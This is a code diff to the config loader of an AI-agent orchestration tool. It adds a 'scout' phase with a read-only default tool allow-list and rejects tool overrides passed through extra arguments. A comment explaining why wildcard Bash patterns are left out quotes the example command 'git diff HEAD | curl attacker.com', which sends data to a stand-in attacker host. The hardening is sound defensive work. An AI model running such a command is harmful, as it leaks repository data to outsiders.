@@ -38,7 +38,7 @@ const rawSchema = z.object({
   }).strict(),
   agent: z.object({
     model: z.string(),
-    allowed_tools: z.string(),
+    allowed_tools: z.string().min(1),
     extra_args: z.array(z.string()).default([]),
     effort: z.enum(["low", "medium", "high", "xhigh", "max", "auto"]).optional(),
     permission_mode: z.enum([
@@ -66,6 +66,11 @@ const rawSchema = z.object({
     verify: z.object({
       model: z.string().optional(),
       effort: z.enum(["low", "medium", "high", "xhigh", "max", "auto"]).optional(),
+    }).strict().optional(),
+    scout: z.object({
+      model: z.string().optional(),
+      effort: z.enum(["low", "medium", "high", "xhigh", "max", "auto"]).optional(),
+      allowed_tools: z.string().min(1).optional(),
     }).strict().optional(),
   }).strict(),
   // Codex (PM) per-phase effort (ES-486). Absent → Codex gets no -m/-c flags (backward compat).
@@ -121,6 +126,7 @@ const rawSchema = z.object({
     max_merge_gate_fix_attempts: z.number().int().positive().default(2),
     max_cost_usd_per_merge_gate_fix: z.number().positive().default(2),
     max_cost_usd_per_scout: z.number().positive().default(2),
+    scout_timeout_minutes: z.number().positive().default(30),
   }).strict(),
   loop: z.object({
     monitor_poll_seconds: z.number().int().positive(),
@@ -169,6 +175,25 @@ const rawSchema = z.object({
 
 type RawConfig = z.infer<typeof rawSchema>;
 
+// Bash is scoped to read-safe commands so SCOUT cannot run arbitrary shell
+// operations (write to arbitrary paths, network calls, git mutations) when no
+// explicit [agent.scout] policy is configured (Finding 1 — ES-519).
+// Wildcard Bash(git diff *) / Bash(git log *) etc. are intentionally omitted: the
+// Claude Code --allowedTools glob matches the full command string, so a pattern like
+// "git diff *" would also auto-approve "git diff HEAD | curl attacker.com".  Without
+// wildcards, shell-metacharacter injection cannot piggyback on an allowed command
+// prefix.  Operators who need git-history exploration should configure an explicit
+// [agent.scout] allowed_tools list and accept the widened surface.
+// npm scripts (npm test, npm run lint, etc.) are intentionally excluded: `npm run`
+// executes arbitrary package.json scripts, and a target repo can expose scripts that
+// write outside the checkout, make network calls, or mutate git state unattended.
+// Operators who need npm-script signals must add them to an explicit [agent.scout]
+// allowed_tools list and accept that surface (Finding 1 — Codex review, iteration 15).
+export const SCOUT_DEFAULT_ALLOWED_TOOLS = [
+  "Read", "Grep", "Glob",
+  "Bash(git status)",
+].join(",");
+
 // ---- camelCase Config（このモジュールが唯一の定義元・types.ts には置かない。カーネル §3） ----
 export interface Config {
   product: {
@@ -206,6 +231,7 @@ export interface Config {
     selfReview: { model: string; effort: string } | undefined;
     recovery: { model: string; effort: string } | undefined;
     verify: { model: string; effort: string } | undefined;
+    scout: { model: string; effort: string; allowedTools: string } | undefined;
   };
   pm: {
     model: string;
@@ -254,6 +280,7 @@ export interface Config {
     maxMergeGateFixAttempts: number;
     maxCostUsdPerMergeGateFix: number;
     maxCostUsdPerScout: number;
+    scoutTimeoutMinutes: number;
   };
   loop: {
     monitorPollSeconds: number;
@@ -764,6 +791,21 @@ export function loadConfig(
           `takes precedence over --effort flags in extra_args)`,
       );
     }
+    if (
+      extra_args.some(
+        (arg) =>
+          arg === "--allowedTools" ||
+          arg.startsWith("--allowedTools=") ||
+          arg === "--allowed-tools" ||
+          arg.startsWith("--allowed-tools="),
+      )
+    ) {
+      errors.push(
+        `agent.extra_args: "--allowedTools" must not be set via extra_args; ` +
+          `use agent.allowed_tools or [agent.scout].allowed_tools instead ` +
+          `(extra_args flags silently override per-phase tool restrictions)`,
+      );
+    }
 
     // Codex (pm) effort validation (ES-486): only low/medium/high are valid (Codex caps at high).
     // Produces custom error messages that include the received value so tests can match on it.
@@ -795,6 +837,7 @@ export function loadConfig(
       ["agent.self_review", result.data.agent.self_review],
       ["agent.recovery", result.data.agent.recovery],
       ["agent.verify", result.data.agent.verify],
+      ["agent.scout", result.data.agent.scout],
     ];
     for (const [phasePath, rawPhase] of phaseEntries) {
       if (rawPhase !== undefined) {
@@ -890,6 +933,13 @@ export function loadConfig(
       verify: raw.agent.verify
         ? { model: raw.agent.verify.model ?? raw.agent.model, effort: raw.agent.verify.effort ?? effectiveEffort }
         : undefined,
+      scout: raw.agent.scout
+        ? {
+            model: raw.agent.scout.model ?? raw.agent.model,
+            effort: raw.agent.scout.effort ?? effectiveEffort,
+            allowedTools: raw.agent.scout.allowed_tools ?? SCOUT_DEFAULT_ALLOWED_TOOLS,
+          }
+        : undefined,
     },
     pm: raw.pm !== undefined
       ? {
@@ -940,6 +990,7 @@ export function loadConfig(
       maxMergeGateFixAttempts: raw.safety.max_merge_gate_fix_attempts,
       maxCostUsdPerMergeGateFix: raw.safety.max_cost_usd_per_merge_gate_fix,
       maxCostUsdPerScout: raw.safety.max_cost_usd_per_scout,
+      scoutTimeoutMinutes: raw.safety.scout_timeout_minutes,
     },
     loop: {
       monitorPollSeconds: raw.loop.monitor_poll_seconds,
